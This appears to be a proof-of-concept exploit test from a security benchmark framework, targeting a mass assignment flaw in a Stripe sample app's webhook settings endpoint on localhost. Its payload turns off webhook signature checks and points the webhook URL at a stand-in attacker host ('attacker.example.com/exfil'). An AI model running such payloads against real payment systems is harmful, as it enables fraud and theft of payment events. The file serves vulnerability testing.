"""PoC exploit: Mass assignment via SQLAlchemy JSON column + flag_modified (CWE-915).

After the 3-stage chain, PUT /webhook/settings accepts arbitrary JSON and
persists it to the database via dict.update() + flag_modified(). The settings
column is db.JSON with no key validation -- any key/value pair the caller
sends is stored verbatim.

The attack:
1. PUT /webhook/settings with {"skip_signature_check": true,
   "max_retry_amount": 999999, "notify_refunds": true}
2. The arbitrary data persists to the WebhookConfig row in the database
3. If any middleware, webhook handler, or downstream payment logic reads
   config.settings["skip_signature_check"] or config.settings["max_retry_amount"],
   the attacker controls webhook processing behavior
4. Even without explicit reads, storing arbitrary attacker-controlled data
   in an unvalidated JSON column is a mass assignment flaw -- the application
   has no control over what keys are written

This targets the Stripe payment sample app's webhook configuration.
"""

from mosaic.oracle.exploit import ExploitTest


class StripeFlagModifiedExploit(ExploitTest):
    """Mass assignment via SQLAlchemy JSON webhook settings with flag_modified persistence."""

    def __init__(self, base_url: str = "http://localhost:43211"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "stripe_flag_modified"

    def setup(self) -> None:
        """No setup required -- webhook config is seeded on startup."""
        pass

    def execute(self) -> tuple[bool, str]:
        """PUT webhook settings with mass assignment payload and verify persistence."""
        evidence_parts = []
        vuln_found = False

        # Step 1: GET initial settings (should be default webhook config)
        resp_init = self.http_get("/webhook/settings")

        if resp_init.status_code == 404:
            return False, (
                "Webhook settings endpoint not available (404). "
                "GET /webhook/settings not implemented."
            )

        if not resp_init.ok:
            return False, (
                f"Webhook settings endpoint error: "
                f"{resp_init.status_code} {resp_init.text[:200]}"
            )

        try:
            initial = resp_init.json()
            if initial is None:
                initial = {}
        except Exception:
            initial = {}

        evidence_parts.append(f"Initial settings: {initial}")

        # Step 2: PUT with mass assignment payload -- webhook-relevant fields
        payload = {
            "skip_signature_check": True,
            "max_retry_amount": 999999,
            "notify_refunds": True,
            "endpoint_url": "https://attacker.example.com/exfil",
        }

        resp_put = self.http_put(
            "/webhook/settings",
            json=payload,
        )

        if resp_put.status_code == 404:
            return False, (
                "PUT webhook settings endpoint not found (404). "
                "PUT /webhook/settings not implemented."
            )

        if not resp_put.ok:
            return False, (
                f"PUT webhook settings failed: "
                f"{resp_put.status_code} {resp_put.text[:200]}"
            )

        try:
            patched = resp_put.json()
            if patched is None:
                patched = {}
        except Exception:
            patched = {}

        evidence_parts.append(f"PUT response: {patched}")

        # Step 3: GET settings again to verify persistence
        resp_verify = self.http_get("/webhook/settings")

        if not resp_verify.ok:
            return False, (
                f"GET webhook settings after PUT failed: "
                f"{resp_verify.status_code} {resp_verify.text[:200]}"
            )

        try:
            verified = resp_verify.json()
            if verified is None:
                verified = {}
        except Exception:
            verified = {}

        evidence_parts.append(f"Verified settings: {verified}")

        # Check if the payload persisted
        if isinstance(verified, dict):
            if verified.get("skip_signature_check") is True:
                evidence_parts.append(
                    "skip_signature_check: true persisted in settings -- "
                    "attacker can bypass webhook signature verification."
                )
                vuln_found = True

            if verified.get("max_retry_amount") == 999999:
                evidence_parts.append(
                    "max_retry_amount: 999999 persisted in settings -- "
                    "attacker can override retry limits."
                )
                vuln_found = True

            if verified.get("notify_refunds") is True:
                evidence_parts.append(
                    "notify_refunds: true persisted in settings -- "
                    "attacker can enable refund notifications to attacker endpoint."
                )
                vuln_found = True

            if verified.get("endpoint_url") == "https://attacker.example.com/exfil":
                evidence_parts.append(
                    "endpoint_url redirected to attacker domain -- "
                    "webhook events will be sent to attacker-controlled server."
                )
                vuln_found = True

        # Also check if the PUT response itself shows the data
        if not vuln_found and isinstance(patched, dict):
            if patched.get("skip_signature_check") is True:
                evidence_parts.append(
                    "skip_signature_check: true returned in PUT response "
                    "(persistence unconfirmed)."
                )
                if not isinstance(verified, dict) or verified.get("skip_signature_check") is not True:
                    evidence_parts.append(
                        "BUT GET does not reflect changes -- "
                        "flag_modified('settings') may be missing."
                    )
                else:
                    vuln_found = True

        if vuln_found:
            return True, (
                f"Mass assignment via JSON webhook settings column (CWE-915). "
                f"Arbitrary user-controlled JSON persists to the database via "
                f"PUT /webhook/settings. Webhook processing fields like "
                f"skip_signature_check, max_retry_amount, and endpoint_url can "
                f"be overwritten by any caller. "
                + " ".join(evidence_parts)
            )

        return False, (
            f"Settings changes did not persist. Either flag_modified is "
            f"missing (stage 3 not applied) or the endpoint is not "
            f"functional. " + " ".join(evidence_parts)
        )
